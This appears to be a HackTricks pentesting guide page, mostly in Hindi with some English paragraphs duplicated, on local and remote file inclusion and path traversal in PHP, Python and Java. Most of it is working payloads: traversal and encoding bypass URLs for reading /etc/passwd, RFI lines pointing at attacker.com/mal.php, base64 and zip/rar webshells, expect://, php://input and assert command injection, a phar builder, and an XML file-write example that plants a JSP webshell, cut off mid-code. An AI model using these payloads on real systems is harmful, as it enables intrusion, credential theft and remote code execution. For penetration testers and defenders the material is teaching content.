# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** फाइल एक remote सर्वर से लोड होती है (Best: आप कोड लिख सकते हैं और सर्वर उसे execute करेगा)। In php यह डिफ़ॉल्ट रूप से **disabled** है (**allow_url_include**).\
**Local File Inclusion (LFI):** सर्वर एक local फ़ाइल लोड करता है।

यह vulnerability तब उत्पन्न होती है जब user किसी तरह उस फ़ाइल को control कर सकता है जिसे server लोड करने वाला है।

कमज़ोर **PHP functions**: require, require_once, include, include_once

एक उपयोगी टूल इस vulnerability को exploit करने के लिए: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**कई \*nix LFI सूचियों को मिलाकर और अधिक पथ जोड़कर मैंने यह बनाई है:**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

यह भी आज़माएँ कि `/` को `\`\
यह भी आज़माएँ कि `../../../../../` जोड़ें

फ़ाइल /etc/password खोजने के लिए कई तकनीकों का प्रयोग करने वाली एक सूची (कमज़ोरी के मौजूद होने की जाँच के लिए) [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt) पर मिल सकती है।

### **Windows**

विभिन्न wordlists का मिश्रण:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

यह भी आज़माएँ कि `/` को `\`\
यह भी आज़माएँ कि `C:/` हटाएँ और `../../../../../` जोड़ें

फ़ाइल /boot.ini खोजने के लिए कई तकनीकों का प्रयोग करने वाली एक सूची (कमज़ोरी के मौजूद होने की जाँच के लिए) [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt) पर मिल सकती है।

### **OS X**

linux की LFI सूची देखें।

## बुनियादी LFI और bypasses

सभी उदाहरण Local File Inclusion के लिए हैं लेकिन इन्हें Remote File Inclusion पर भी लागू किया जा सकता है (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)/>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences को गैर-पुनरावर्ती रूप से हटाया गया
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Bypass प्रदत्त स्ट्रिंग के अंत में अतिरिक्त characters जोड़ने को रोकने के लिए (bypass of: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
यह **PHP 5.4 के बाद से हल हो चुका है**

### **एन्कोडिंग**

आप non-standard encodings का उपयोग कर सकते हैं, जैसे double URL encode (और अन्य):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### मौजूदा फ़ोल्डर से

शायद back-end फ़ोल्डर पथ की जाँच कर रहा है:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### सर्वर पर फ़ाइल सिस्टम निर्देशिकाओं का अन्वेषण

किसी सर्वर के फ़ाइल सिस्टम को कुछ तकनीकों का उपयोग करके रिकर्सिव तरीके से खोजा जा सकता है ताकि केवल फ़ाइलें ही नहीं बल्कि निर्देशिकाओं (directories) की भी पहचान हो सके। यह प्रक्रिया वर्तमान निर्देशिका की गहराई निर्धारित करने और विशिष्ट फ़ोल्डरों के अस्तित्व की जाँच करने पर आधारित है। इसे प्राप्त करने का एक विस्तृत तरीका नीचे दिया गया है:

1. **निर्देशिका गहराई निर्धारित करें:** अपनी वर्तमान निर्देशिका की गहराई की पुष्टि `/etc/passwd` फ़ाइल को सफलतापूर्वक प्राप्त करके करें (यदि सर्वर Linux-आधारित है)। उदाहरण URL निम्नलिखित संरचना का हो सकता है, जो तीन स्तर की गहराई का संकेत देता है:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **फ़ोल्डरों की जाँच:** URL में संदिग्ध फ़ोल्डर का नाम जोड़ें (उदा., `private`) और फिर `/etc/passwd` पर वापस जाएँ। अतिरिक्त डायरेक्टरी स्तर के कारण depth को एक बढ़ाना होगा:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **परिणामों की व्याख्या:** सर्वर का उत्तर यह संकेत देता है कि फोल्डर मौजूद है या नहीं:
- **Error / No Output:** फ़ोल्डर `private` संभवतः निर्दिष्ट स्थान पर मौजूद नहीं है।
- **Contents of `/etc/passwd`:** `private` फ़ोल्डर की उपस्थिति की पुष्टि होती है।
4. **Recursive Exploration:** पाए गए फ़ोल्डरों की आगे उपनिर्देशिकाएँ या फाइलें उसी तकनीक या पारंपरिक Local File Inclusion (LFI) तरीकों का उपयोग करके और जांची जा सकती हैं।

फ़ाइल सिस्टम में अलग-अलग स्थानों पर निर्देशिकाओं का पता लगाने के लिए, payload को उसी के अनुसार समायोजित करें। उदाहरण के लिए, यह जाँचने के लिए कि `/var/www/` में `private` निर्देशिका है या नहीं (मान लेते हैं कि वर्तमान निर्देशिका गहराई 3 पर है), उपयोग करें:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation एक तरीका है जो वेब एप्लिकेशन में फ़ाइल पथों को मैनिपुलेट करने के लिए उपयोग होता है। इसे अक्सर प्रतिबंधित फ़ाइलों तक पहुँचने के लिए इस्तेमाल किया जाता है, ताकि उन सुरक्षा उपायों को बायपास किया जा सके जो फ़ाइल पथों के अंत में अतिरिक्त चरित्र जोड़ते हैं। उद्देश्य यह है कि ऐसा फ़ाइल पथ तैयार किया जाए कि सुरक्षा उपाय द्वारा बदलने के बाद भी वह इच्छित फ़ाइल की ओर इशारा करे।

In PHP, विभिन्न प्रतिनिधित्वों को फ़ाइल सिस्टम की प्रकृति के चलते समान माना जा सकता है। उदाहरण के लिए:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, and `/etc/passwd/` सभी को एक ही पथ माना जाता है।
- जब अंतिम 6 अक्षर `passwd` हों, तो अंत में `/` जोड़ना (इसे `passwd/` बना देने से) लक्षित फ़ाइल नहीं बदलती।
- इसी तरह, यदि किसी फ़ाइल पथ के साथ `.php` जुड़ा हो (जैसे `shellcode.php`), तो अंत में `/.` जोड़ने से एक्सेस की जा रही फ़ाइल में कोई परिवर्तन नहीं होता।

निम्न उदाहरण दिखाते हैं कि कैसे path truncation का उपयोग करके `/etc/passwd` तक पहुँच प्राप्त की जा सकती है, जो अपनी संवेेदनशील सामग्री (उपयोगकर्ता खाता जानकारी) के कारण एक सामान्य लक्ष्य है:
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
इन परिदृश्यों में आवश्यक traversals की संख्या लगभग 2027 हो सकती है, लेकिन यह संख्या सर्वर की कॉन्फ़िगरेशन के आधार पर बदल सकती है।

- **Using Dot Segments and Additional Characters**: Traversal sequences (`../`) को अतिरिक्त dot segments और characters के साथ मिलाकर file system में नेविगेट करने के लिए उपयोग किया जा सकता है, जिससे सर्वर द्वारा जोड़े गए appended strings प्रभावी रूप से अनदेखा हो जाते हैं।
- **Determining the Required Number of Traversals**: trial and error के माध्यम से, कोई सही संख्या `../` sequences पता कर सकता है जो root directory तक और फिर `/etc/passwd` तक नेविगेट करने के लिए आवश्यक हो, यह सुनिश्चित करते हुए कि किसी भी appended strings (जैसे `.php`) को neutralize किया गया है लेकिन इच्छित path (`/etc/passwd`) अपरिवर्तित रहता है।
- **Starting with a Fake Directory**: यह एक आम प्रथा है कि path को non-existent directory (जैसे `a/`) से शुरू किया जाए। यह technique सुरक्षा के तौर पर या सर्वर की path parsing logic की आवश्यकताओं को पूरा करने के लिए इस्तेमाल की जाती है।

जब path truncation techniques का उपयोग किया जा रहा हो, तो सर्वर के path parsing व्यवहार और filesystem संरचना को समझना महत्वपूर्ण है। हर परिदृश्य अलग तरीका मांग सकता है, और सबसे प्रभावी method खोजने के लिए अक्सर testing आवश्यक होती है।

**यह vulnerability PHP 5.3 में ठीक की गई थी।**

### **Filter bypass tricks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

PHP में यह डिफ़ॉल्ट रूप से अक्षम होता है क्योंकि **`allow_url_include`** **Off** है। इसे काम करने के लिए **On** होना चाहिए, और उस स्थिति में आप अपने सर्वर से एक PHP फ़ाइल include करके RCE प्राप्त कर सकते हैं:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
यदि किसी कारण से **`allow_url_include`** **On** है, लेकिन PHP बाहरी वेबपेजों तक पहुँच को **filtering** कर रहा है, [according to this post](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), तो आप उदाहरण के लिए data protocol के साथ base64 का उपयोग करके b64 PHP code को डिकोड करके RCE प्राप्त कर सकते हैं:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> पिछले कोड में, अंतिम `+.txt` इसलिए जोड़ा गया था क्योंकि attacker को एक ऐसे string की जरूरत थी जो `.txt` में खत्म होता हो, इसलिए string इसके साथ खत्म होता है और b64 decode के बाद वह हिस्सा बस जंक लौटाएगा और असली PHP code include (और इसलिए, executed) हो जाएगा।

एक और उदाहरण **`php://` protocol का उपयोग न करते हुए** होगा:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python रूट एलिमेंट

python में, इस तरह के कोड में:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
यदि उपयोगकर्ता **absolute path** को **`file_name`** में पास करता है, तो **previous path** बस हटा दिया जाता है:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
It is the intended behaviour according to [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> यदि कोई component एक absolute path है, तो सभी पिछले components हटा दिए जाते हैं और joining absolute path component से जारी रहती है।

## Java डायरेक्टरी सूची

ऐसा लगता है कि यदि Java में आपके पास Path Traversal है और आप **file** की बजाय **directory** के लिए अनुरोध करते हैं, तो उस **directory** की **listing** वापस कर दी जाती है। यह अन्य भाषाओं में (जहाँ तक मुझे पता है) नहीं होगा।

## Top 25 parameters

यहाँ शीर्ष 25 पैरामीटरों की सूची है जो local file inclusion (LFI) vulnerabilities के लिए vulnerable हो सकते हैं (from [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI का उपयोग PHP wrappers & protocols

### php://filter

PHP filters आपको डेटा को पढ़ने या लिखने से पहले उस पर बुनियादी **मॉडिफिकेशन ऑपरेशन करने** की अनुमति देते हैं। filters के 5 कैटेगरी हैं:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: डेटा से टैग्स हटा देता है (जो "<" और ">" chars के बीच है)
- Note that this filter has disappear from the modern versions of PHP
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : एक अलग encoding में बदलता है (`convert.iconv.<input_enc>.<output_enc>`). सपोर्ट किए गए सभी encodings की **सूची** पाने के लिए console में चलाएँ: `iconv -l`

> [!WARNING]
> Abusing the `convert.iconv.*` conversion filter you can **generate arbitrary text**, which could be useful to write arbitrary text or make a function like include process arbitrary text. For more info check [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: कंटेंट को संपीड़ित करता है (useful if exfiltrating a lot of info)
- `zlib.inflate`: डेटा को decompress करता है
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : Deprecated
- `mdecrypt.*` : Deprecated
- Other Filters
- php में `var_dump(stream_get_filters());` चलाने पर आप कुछ **अनपेक्षित filters** पा सकते हैं:
- `consumed`
- `dechunk`: HTTP chunked encoding को reverse करता है
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> "php://filter" हिस्सा केस-संवेदनशील नहीं है

### php filters को oracle के रूप में उपयोग करके किसी भी फ़ाइल को पढ़ना

[**In this post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) एक ऐसी तकनीक प्रस्तावित की गई है जिससे सर्वर से आउटपुट वापस दिए बिना लोकल फ़ाइल पढ़ी जा सकती है। यह तकनीक **boolean exfiltration of the file (char by char) using php filters** पर आधारित है और इसका आधार यह है कि php filters का उपयोग किसी टेक्स्ट को इतना बड़ा बनाने के लिए किया जा सकता है कि php एक exception फेंक दे।

मूल पोस्ट में तकनीक की विस्तृत व्याख्या है, लेकिन यहाँ एक संक्षेप:

- Use the codec **`UCS-4LE`** ताकि टेक्स्ट का leading character शुरुआत में रहे और स्ट्रिंग का साइज घातीय रूप से बढ़े।
- यह उपयोग किया जाएगा ताकि एक **text so big when the initial letter is guessed correctly** बन सके जिससे php एक **error** ट्रिगर करेगा।
- The **dechunk** filter **remove everything if the first char is not an hexadecimal**, इसलिए हम जान पाएँगे कि पहला char hex है या नहीं।
- यह, पिछले वाले के साथ मिलकर (और अनुमानित अक्षर पर निर्भर अन्य filters के साथ), हमें टेक्स्ट की शुरुआत में एक अक्षर का अनुमान लगाने में सक्षम करेगा यह देखकर कि कब हम पर्याप्त transformations करके उसे hexadecimal character न बना दें। क्योंकि अगर hex है तो dechunk उसे नहीं हटायेगा और initial bomb php error करवा देगा।
- The codec **convert.iconv.UNICODE.CP930** हर अक्षर को अगले अक्षर में बदलता है (तो इस codec के बाद: a -> b)। इससे हमें पता चल सकता है कि पहला अक्षर उदाहरण के लिए `a` है क्योंकि अगर हम इस codec को 6 बार लागू करते हैं a->b->c->d->e->f->g तो वह अक्षर अब hexadecimal character नहीं रहेगा, इसलिए dechunk उसे नहीं हटायेगा और php error ट्रिगर होगा क्योंकि यह initial bomb के साथ गुणा करता है।
- शुरुआत में अन्य transformations जैसे **rot13** का उपयोग करके n, o, p, q, r जैसे अन्य chars को भी leak करना संभव है (और अन्य codecs का उपयोग करके अन्य अक्षरों को hex रेंज में लाया जा सकता है)।
- जब प्रारम्भिक char एक संख्या होती है तो उसे base64 encode करना ज़रूरी होता है और संख्या को leak करने के लिए पहले 2 अक्षरों को leak करना पड़ता है।
- अंतिम समस्या यह देखना है कि **how to leak more than the initial letter**। order memory filters जैसे **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** का उपयोग करके char के order को बदलना और टेक्स्ट के अन्य अक्षरों को पहले स्थान पर लाना संभव है।
- और आगे के डेटा प्राप्त करने के लिए विचार यह है कि शुरुआत में **convert.iconv.UTF16.UTF16** के साथ **2 bytes of junk data at the beginning** जनरेट करें, फिर **UCS-4LE** लागू करके इसे अगले 2 bytes के साथ **pivot** कराएं, और d**elete the data until the junk data** (यह प्रारम्भिक टेक्स्ट के पहले 2 bytes को हटा देगा)। इसे तब तक जारी रखें जब तक आप उस चाही हुई बिट तक नहीं पहुँच जाते जिसे leak करना है।

पोस्ट में इसे स्वचालित रूप से करने के लिए एक टूल भी leaked हुआ: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

यह wrapper प्रक्रिया द्वारा खुले हुए file descriptors तक पहुँचने की अनुमति देता है। संभावित रूप से opened files की सामग्री को exfiltrate करने के लिए उपयोगी:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
आप **php://stdin, php://stdout और php://stderr** का उपयोग करके क्रमशः **file descriptors 0, 1 और 2** तक पहुँच सकते हैं (यह किसी हमले में कैसे उपयोगी हो सकता है, यह निश्चित नहीं)।

### zip:// and rar://

एक Zip या Rar फ़ाइल अपलोड करें जिसमें अंदर PHPShell हो और उसे एक्सेस करें.\
rar protocol को दुरुपयोग करने में सक्षम होने के लिए इसे **विशेष रूप से सक्रिय किया जाना चाहिए**।
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
ध्यान दें कि यह प्रोटोकॉल php कॉन्फ़िगरेशन **`allow_url_open`** और **`allow_url_include`** द्वारा प्रतिबंधित है

### expect://

Expect को सक्रिय होना चाहिए। आप इसका उपयोग करके कोड निष्पादित कर सकते हैं:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

अपने payload को POST parameters में निर्दिष्ट करें:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

जब कोई वेब एप्लिकेशन फ़ाइल लोड करने के लिए `include` जैसे फ़ंक्शन का उपयोग करता है, तो `.phar` फ़ाइल का उपयोग PHP कोड चलाने के लिए किया जा सकता है। नीचे दिया गया PHP कोड स्निपेट एक `.phar` फ़ाइल बनाने का तरीका दिखाता है:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
`.phar` फ़ाइल को संकलित करने के लिए, निम्नलिखित कमांड को निष्पादित किया जाना चाहिए:
```bash
php --define phar.readonly=0 create_path.php
```
Upon execution, a file named `test.phar` will be created, which could potentially be leveraged to exploit Local File Inclusion (LFI) vulnerabilities.

एग्जीक्यूशन पर, एक फ़ाइल जिसका नाम `test.phar` होगा बनाई जाएगी, जिसे संभावित रूप से Local File Inclusion (LFI) कमजोरियों का शोषण करने के लिए उपयोग किया जा सकता है।

In cases where the LFI only performs file reading without executing the PHP code within, through functions such as `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, or `filesize()`, exploitation of a deserialization vulnerability could be attempted. This vulnerability is associated with the reading of files using the `phar` protocol.

यदि LFI केवल फ़ाइल पढ़ता है और फ़ाइल के भीतर के PHP कोड को execute नहीं करता — जैसे कि `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, या `filesize()` जैसी functions के माध्यम से — तो deserialization vulnerability का शोषण करने की कोशिश की जा सकती है। यह vulnerability `phar` protocol के माध्यम से फ़ाइल पढ़ने से जुड़ी है।

For a detailed understanding of exploiting deserialization vulnerabilities in the context of `.phar` files, refer to the document linked below:

`.phar` files के संदर्भ में deserialization vulnerabilities के शोषण को समझने के लिए, नीचे दिए गए दस्तावेज़ को देखें:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

It was possible to abuse **any arbitrary file read from PHP that supports php filters** to get a RCE. The detailed description can be [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Very quick summary: a **3 byte overflow** in the PHP heap was abused to **alter the chain of free chunks** of anspecific size in order to be able to **write anything in any address**, so a hook was added to call **`system`**.\
It was possible to alloc chunks of specific sizes abusing more php filters.

यह संभव था कि PHP में php filters को सपोर्ट करने वाली **any arbitrary file read from PHP that supports php filters** का दुरुपयोग करके RCE प्राप्त किया जा सके। विस्तृत विवरण [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
बहुत संक्षेप में: PHP heap में एक **3 byte overflow** का दुरुपयोग करके किसी विशिष्ट आकार के free chunks की श्रृंखला को **alter the chain of free chunks** करने के लिए उकसाया गया ताकि किसी भी address में **write anything in any address** किया जा सके, इसलिए एक hook जोड़ा गया था जो **`system`** को कॉल करता था।\
अधिक php filters का दुरुपयोग करके विशिष्ट आकार के chunks को alloc करना संभव था।

### More protocols

Check more possible[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

### और प्रोटोकॉल

और अधिक संभावित[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)** देखें:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Write in memory or in a temporary file (not sure how this can be useful in a file inclusion attack)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — Accessing local filesystem
- [http://](https://www.php.net/manual/en/wrappers.http.php) — Accessing HTTP(s) URLs
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Accessing FTP(s) URLs
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Compression Streams
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Find pathnames matching pattern (It doesn't return nothing printable, so not really useful here)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Audio streams (Not useful to read arbitrary files)

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — मेमोरी में या अस्थायी फ़ाइल में लिखता है (यह file inclusion attack में कैसे उपयोगी हो सकता है, स्पष्ट नहीं)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — स्थानीय फ़ाइल सिस्टम तक पहुँच
- [http://](https://www.php.net/manual/en/wrappers.http.php) — HTTP(s) URLs तक पहुँच
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — FTP(s) URLs तक पहुँच
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — कंप्रेशन स्ट्रीम्स
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — पैटर्न से मेल खाने वाले pathnames खोजें (यह कुछ मुद्रनीय नहीं लौटाता, इसलिए यहाँ वास्तव में उपयोगी नहीं है)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — ऑडियो स्ट्रीम्स (arbitrary files पढ़ने के लिए उपयोगी नहीं)

## LFI via PHP's 'assert'

Local File Inclusion (LFI) risks in PHP are notably high when dealing with the 'assert' function, which can execute code within strings. This is particularly problematic if input containing directory traversal characters like ".." is being checked but not properly sanitized.

PHP में Local File Inclusion (LFI) का जोखिम विशेष रूप से तब अधिक होता है जब 'assert' function का उपयोग होता है, क्योंकि यह string के भीतर code execute कर सकता है। यह खासकर तब समस्या उत्पन्न करता है जब input जिसमें directory traversal characters जैसे ".." होते हैं, जाँचा तो जा रहा हो पर सही तरह से sanitize नहीं किया गया हो।

For example, PHP code might be designed to prevent directory traversal like so:

उदाहरण के लिए, PHP कोड directory traversal को रोकने के लिए इस तरह लिखा जा सकता है:
```bash
assert("strpos('$file', '..') === false") or die("");
```
हालाँकि इसका उद्देश्य traversal को रोकना है, यह अनजाने में code injection के लिए एक वेक्टर बना देता है। फ़ाइल की सामग्री पढ़ने के लिए इसका फायदा उठाने के लिए, एक attacker उपयोग कर सकता है:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
इसी तरह, किसी भी सिस्टम कमांड को निष्पादित करने के लिए, कोई उपयोग कर सकता है:
```plaintext
' and die(system("id")) or '
```
It's important to **URL-encode these payloads**.

## PHP Blind Path Traversal

> [!WARNING]
> यह तकनीक उन मामलों में लागू होती है जहाँ आप किसी **PHP function** के **file path** को **control** करते हैं जो किसी फ़ाइल को **access** करेगा, लेकिन आप फ़ाइल की सामग्री नहीं देख पाएँगे (जैसे एक साधारण कॉल **`file()`**) और सामग्री दिखाई नहीं जाती।

In [**यह शानदार पोस्ट**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) यह समझाया गया है कि कैसे एक blind path traversal को PHP filter के जरिए फ़ाइल की सामग्री को **exfiltrate** करने के लिए abuse किया जा सकता है via an **error oracle**।

सारांश के रूप में, यह तकनीक **"UCS-4LE" encoding** का उपयोग करके फ़ाइल की सामग्री को इतना बड़ा बना देती है कि फ़ाइल खोलने वाला **PHP function** एक **error** trigger कर दे।

फिर, पहले char को leak करने के लिए filter **`dechunk`** का उपयोग किया जाता है, साथ ही **base64** या **rot13** जैसे अन्य filters के साथ, और अंत में filters **convert.iconv.UCS-4.UCS-4LE** और **convert.iconv.UTF16.UTF-16BE** का उपयोग करके अन्य chars को शुरुआत में रखकर उन्हें leak किया जाता है।

**Functions that might be vulnerable**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

For the technical details check the mentioned post!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

जब server-side कोड जो फ़ाइलें ingest/uploads करता है, destination path को user-controlled डेटा (जैसे filename या URL) से बनाता है बिना उसे canonicalise और validate किए, तो `..` segments और absolute paths intended directory से बाहर निकल कर arbitrary file write कर सकते हैं। यदि आप payload को किसी web-exposed directory में रख सकते हैं, तो आम तौर पर webshell drop करके unauthenticated RCE मिल जाता है।

Typical exploitation workflow:
- Identify a write primitive in an endpoint or background worker that accepts a path/filename and writes content to disk (e.g., message-driven ingestion, XML/JSON command handlers, ZIP extractors, etc.).
- Determine web-exposed directories. Common examples:
- Apache/PHP: `/var/www/html/`
- Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
- IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- Craft a traversal path that breaks out of the intended storage directory into the webroot, and include your webshell content.
- Browse to the dropped payload and execute commands.

Notes:
- The vulnerable service that performs the write may listen on a non-HTTP port (e.g., a JMF XML listener on TCP 4004). The main web portal (different port) will later serve your payload.
- On Java stacks, these file writes are often implemented with simple `File`/`Paths` concatenation. Lack of canonicalisation/allow-listing is the core flaw.

Generic XML/JMF-style example (product schemas vary – the DOCTYPE/body wrapper is irrelevant for the traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
